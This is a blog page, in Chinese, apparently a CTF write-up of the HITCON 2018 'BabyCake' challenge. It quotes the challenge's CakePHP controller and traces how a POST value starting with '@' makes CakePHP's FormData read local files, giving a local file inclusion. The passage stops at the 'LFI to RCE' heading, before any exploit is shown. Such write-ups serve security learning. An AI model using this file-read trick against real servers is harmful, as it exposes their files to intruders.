@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="花了几天时间搞明白一道题，放环境有点晚。 源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON2018-BabyCake">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="花了几天时间搞明白一道题，放环境有点晚。 源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-05-15T06:42:10.000Z">
+<meta property="article:modified_time" content="2020-03-05T07:18:53.441Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CakePHP">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HITCON2018-BabyCake | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#part-2.lfi-to-rce."><span class="nav-number">1.</span> <span class="nav-text">Part 2.LFI to RCE.</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HITCON2018-BabyCake
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-05-15 14:42:10" itemprop="dateCreated datePublished" datetime="2019-05-15T14:42:10+08:00">2019-05-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-03-05 15:18:53" itemprop="dateModified" datetime="2020-03-05T15:18:53+08:00">2020-03-05</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/05/15/HITCON2018-BabyCake/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/05/15/HITCON2018-BabyCake/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>花了几天时间搞明白一道题，放<a target="_blank" rel="noopener" href="https://github.com/Tiaonmmn/hitcon_2018_babycake">环境</a>有点晚。</p>
+<p>源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。 <a id="more"></a> # Part 1.Look inside the code,and LFI.</p>
+<p>重点代码在 src.php 里。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$headers, $body</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = $headers;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body = $body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span>(<span class="params">$method, $url, $headers, $data</span>) </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span> =&gt; $headers, </span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line">    </span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;pages&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">        $index = sprintf(<span class="string">&#x27;mycache/%s/%s/&#x27;</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span>(<span class="params">$key, $response</span>) </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">&quot;body.cache&quot;</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">&quot;headers.cache&quot;</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span>(<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">&quot;/body.cache&quot;</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">&quot;/headers.cache&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            $body = <span class="string">&quot;&lt;!-- from cache --&gt;\n&quot;</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params">...$path</span>) </span>&#123;    </span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line">    </span><br><span class="line">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line">    </span><br><span class="line">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>, <span class="string">&#x27;expect&#x27;</span>, <span class="string">&#x27;content-length&#x27;</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">&#x27;content-type&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">&#x27;type&#x27;</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很明显，允许我们输入的 URL 只能是 HTTP 或 HTTPS 协议的，然后根据访问题目页面的 HTTP 方式去，通过一个 httpclient 来对输入 URL 进行访问。如果使用的是 GET 方式，会设置缓存。同时，访问题目页面时的 HTTP 头也会同时发送到 httpclient 中。</p>
+<p>  然后我们该看啥？从来没有源码审计的经验，没思路。既然我们请求的 URL 是通过 httpclient 实现的，看一下 Httpclient 吧。在这之前，我们注意到在用 GET 请求的时候，会进行缓存操作，而这个缓存是自定义的。在 cache_get () 里，$header 有一个 unserialize 操作，有点可疑，而且是用的 file_get_contents () 读的缓存。同样的，cache_set () 里会对 $response 返回的 headers 序列化，用 file_put_contents () 写的缓存。暂时不知道这两处怎么利用。</p>
+<p>  跟进 Httpclient，这是一个对 Client 类的封装。来到 vendor/cakephp/cakephp/src/Http/Client.php 里。<code>__construct</code> 方法貌似没什么好玩的，就是对 Cookie 的操作。主要是 public function post ($url, $data = [], array $options = []) 这个函数，先 buildUrl，然后_doRequests 发送。buildUrl 没什么意思，对输入的 URL 处理一下。而_doRequests () 先是调用_createRequest ()，然后 send ()。跟进_createRequest ()，前面进行头处理，后面 new 一个 Request 对象。跟进，来到 vendor/cakephp/cakephp/src/Http/Client/Request.php。__construct () 设置了 Connection 和 User-Agent 头后调用 body () 函数处理 $data。而 $data 使用 FormData-&gt;addMany () 处理。跟进 addMany ()，来到 vendor/cakephp/cakephp/src/Http/Client/FormData.php。addMany () 函数就是将 $data 数组逐项喂给 add () 函数，重点来了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">$name, $value = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">        trigger_error(</span><br><span class="line">            <span class="string">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class="line">            <span class="string">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class="line">            E_USER_DEPRECATED</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第 8 行的判断很有问题，如果 $value 首字符为 @，会 trigger_error ()，然后 addFile ()。trigger_error () 不会停止执行，下面看 addFile ()。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_hasFile = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="literal">false</span>;</span><br><span class="line">    $contentType = <span class="string">&#x27;application/octet-stream&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">        $content = stream_get_contents($value);</span><br><span class="line">        <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $metadata = stream_get_meta_data($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($metadata[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">            $filename = basename($metadata[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">        $value = substr($value, <span class="number">1</span>);</span><br><span class="line">        $filename = basename($value);</span><br><span class="line">        $content = file_get_contents($value);</span><br><span class="line">        $contentType = $finfo-&gt;file($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">    $part-&gt;type($contentType);</span><br><span class="line">    <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">        $part-&gt;filename($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $part;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><span class="math inline">\(value 没有任何过滤，直接 file_get_contents (\)</span>value)，然后返回到 $part。因此这里有一处 LFI。然后我们能干什么呢？</p>
+<h1 id="part-2.lfi-to-rce.">Part 2.LFI to RCE.</h1>
